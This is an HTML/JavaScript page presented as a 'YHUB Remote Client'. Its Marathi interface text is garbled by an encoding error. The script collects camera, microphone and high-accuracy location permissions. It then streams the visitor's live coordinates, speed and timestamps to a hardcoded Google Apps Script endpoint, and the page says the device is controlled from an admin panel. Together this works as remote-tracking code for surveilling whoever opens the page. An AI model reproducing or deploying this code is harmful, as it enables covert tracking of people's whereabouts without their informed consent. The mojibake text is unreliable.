<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>YHUB Remote Client</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #0a0c10; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .card { background: #161b22; border-radius: 30px; padding: 2rem; border: 1px solid #30363d; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
        h1 { font-size: 2rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 1rem; text-align: center; }
        .code-box { background: #0d1117; padding: 1rem; border-radius: 30px; text-align: center; font-size: 0.9rem; color: #8b949e; border: 1px solid #30363d; margin: 1.5rem 0; word-break: break-all; }
        .status { background: #0d1117; padding: 1rem; border-radius: 30px; text-align: center; color: #8b949e; border: 1px solid #30363d; margin: 1rem 0; }
        .btn { width: 100%; padding: 1rem; border: none; border-radius: 40px; font-weight: 600; font-size: 1.1rem; cursor: pointer; transition: 0.2s; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; margin: 0.5rem 0; }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .permission-list { margin: 1.5rem 0; }
        .permission-item { background: #0d1117; padding: 1rem; border-radius: 16px; margin: 0.5rem 0; display: flex; justify-content: space-between; align-items: center; }
        .badge { padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; background: #238636; color: white; }
        .badge.pending { background: #9e6a03; }
        .footer { text-align: center; margin-top: 2rem; color: #8b949e; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>üì± YHUB CLIENT</h1>
            
            <div class="code-box" id="device-code">
                ‡§ï‡•ã‡§° ‡§Æ‡§ø‡§≥‡§§ ‡§Ü‡§π‡•á...
            </div>
            
            <div class="status" id="status">
                ‚ö™ ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á...
            </div>
            
            <div class="permission-list">
                <div class="permission-item">
                    <span>üìç ‡§≤‡•ã‡§ï‡•á‡§∂‡§®</span>
                    <span class="badge pending" id="loc-perm">‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§®‡§æ‡§π‡•Ä</span>
                </div>
                <div class="permission-item">
                    <span>üì∏ ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ</span>
                    <span class="badge pending" id="cam-perm">‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§®‡§æ‡§π‡•Ä</span>
                </div>
                <div class="permission-item">
                    <span>üé§ ‡§Æ‡§æ‡§Ø‡§ï‡•ç‡§∞‡•ã‡§´‡•ã‡§®</span>
                    <span class="badge pending" id="mic-perm">‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§®‡§æ‡§π‡•Ä</span>
                </div>
            </div>
            
            <button class="btn" onclick="requestAllPermissions()">
                üîê ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§¶‡•ç‡§Ø‡§æ
            </button>
            
            <div style="margin-top: 1rem; font-size: 0.8rem; color: #8b949e; text-align: center;">
                <p>‚úÖ ‡§è‡§ï‡§¶‡§æ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§¶‡§ø‡§≤‡•ç‡§Ø‡§æ‡§®‡§Ç‡§§‡§∞, ‡§π‡•á ‡§™‡•á‡§ú ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡•Ç ‡§®‡§ï‡§æ.</p>
                <p>üì° ‡•≤‡§°‡§Æ‡§ø‡§® ‡§™‡•Ö‡§®‡§≤‡§µ‡§∞‡•Ç‡§® ‡§ï‡§Ç‡§ü‡•ç‡§∞‡•ã‡§≤ ‡§ï‡•á‡§≤‡•á ‡§ú‡§æ‡§à‡§≤.</p>
            </div>
        </div>
        
        <div class="footer">
            Y HUB REMOTE v4.0 ‚Ä¢ GitHub Edition
        </div>
    </div>

    <script>
        // ---------- ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞‡•á‡§∂‡§® ----------
        const GSHEET_URL = 'https://script.google.com/macros/s/AKfycbyrhp5yU-hyxrQx6OWZDKH4-qZekJgko7wRXvLOypEd-94uJfGWFp8K5DH6cI6U_XSP/exec';
        
        // URL ‡§Æ‡§ß‡•Ç‡§® device code ‡§Æ‡§ø‡§≥‡§µ‡§æ
        const urlParams = new URLSearchParams(window.location.search);
        let deviceCode = urlParams.get('code');
        
        if (!deviceCode) {
            deviceCode = 'dev_' + Math.random().toString(36).substring(2, 10);
            // URL update ‡§ï‡§∞‡§æ
            const newUrl = window.location.origin + window.location.pathname + '?code=' + deviceCode;
            window.history.replaceState({}, '', newUrl);
        }
        
        // ‡§≤‡•ã‡§ï‡§≤ ‡§∏‡•ç‡§ü‡•ã‡§∞‡•á‡§ú‡§Æ‡§ß‡•ç‡§Ø‡•á ‡§∏‡•á‡§µ‡•ç‡§π ‡§ï‡§∞‡§æ
        localStorage.setItem('yhub_device_code', deviceCode);
        
        // ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡§ï‡•ã‡§° ‡§¶‡§æ‡§ñ‡§µ‡§æ
        document.getElementById('device-code').innerHTML = `üì± ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡§ï‡•ã‡§°: <strong>${deviceCode}</strong>`;
        
        // ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§∏‡•ç‡§•‡§ø‡§§‡•Ä
        let permissions = {
            location: false,
            camera: false,
            microphone: false
        };
        
        // ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§µ‡•â‡§ö‡§∞
        let watchId = null;
        
        // ---------- ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§æ‡§ó‡§æ ----------
        async function requestAllPermissions() {
            updateStatus('üì° ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§æ‡§ó‡§ø‡§§‡§≤‡•ç‡§Ø‡§æ ‡§ú‡§æ‡§§ ‡§Ü‡§π‡•á‡§§...');
            
            try {
                // ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä
                const loc = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                permissions.location = true;
                document.getElementById('loc-perm').innerHTML = '‚úÖ ‡§¶‡§ø‡§≤‡•Ä';
                document.getElementById('loc-perm').className = 'badge';
                
                // ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§Ü‡§£‡§ø ‡§Æ‡§æ‡§Ø‡§ï‡•ç‡§∞‡•ã‡§´‡•ã‡§® ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: true 
                });
                stream.getTracks().forEach(track => track.stop());
                
                permissions.camera = true;
                permissions.microphone = true;
                document.getElementById('cam-perm').innerHTML = '‚úÖ ‡§¶‡§ø‡§≤‡•Ä';
                document.getElementById('cam-perm').className = 'badge';
                document.getElementById('mic-perm').innerHTML = '‚úÖ ‡§¶‡§ø‡§≤‡•Ä';
                document.getElementById('mic-perm').className = 'badge';
                
                updateStatus('‚úÖ ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§ø‡§≥‡§æ‡§≤‡•ç‡§Ø‡§æ!');
                
                // ‡§∞‡•á‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•á‡§∂‡§® Google Sheets ‡§µ‡§∞ ‡§™‡§æ‡§†‡§µ‡§æ
                await sendToSheet({
                    device_code: deviceCode,
                    cmd_type: 'register',
                    status: 'active'
                });
                
                // ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§ü‡•ç‡§∞‡•Ö‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ (Service Worker ‡§¶‡•ç‡§µ‡§æ‡§∞‡•á)
                startLocationTracking();
                
            } catch (err) {
                updateStatus('‚ùå ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä: ' + err.message);
                console.error(err);
            }
        }
        
        // ---------- ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§ü‡•ç‡§∞‡•Ö‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ ----------
        function startLocationTracking() {
            if (watchId) return;
            
            watchId = navigator.geolocation.watchPosition(
                async (position) => {
                    // ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§Ö‡§™‡§°‡•á‡§ü Google Sheets ‡§≤‡§æ ‡§™‡§æ‡§†‡§µ‡§æ
                    await sendToSheet({
                        device_code: deviceCode,
                        cmd_type: 'location',
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        speed: position.coords.speed || 0,
                        timestamp: new Date().toISOString()
                    });
                },
                (error) => {
                    console.error('‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä:', error);
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                }
            );
        }
        
        // ---------- Google Sheets ‡§≤‡§æ ‡§°‡•á‡§ü‡§æ ‡§™‡§æ‡§†‡§µ‡§æ ----------
        async function sendToSheet(data) {
            try {
                await fetch(GSHEET_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(data)
                });
            } catch (err) {
                console.error('‡§∂‡•Ä‡§ü ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä:', err);
            }
        }
        
        // ---------- ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏ ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡§æ ----------
        function updateStatus(msg) {
            document.getElementById('status').innerHTML = msg;
        }
        
        // ---------- Service Worker ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§∞‡§æ ----------
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').then(reg => {
                console.log('Service Worker registered');
            }).catch(err => {
                console.log('SW error:', err);
            });
        }
        
        // ---------- ‡§™‡•á‡§ú ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§§‡§æ‡§®‡§æ ‡§ï‡•ç‡§≤‡•Ä‡§®‡§Ö‡§™ ----------
        window.addEventListener('beforeunload', () => {
            if (watchId) {
                navigator.geolocation.clearWatch(watchId);
            }
        });
    </script>
</body>
         </html>
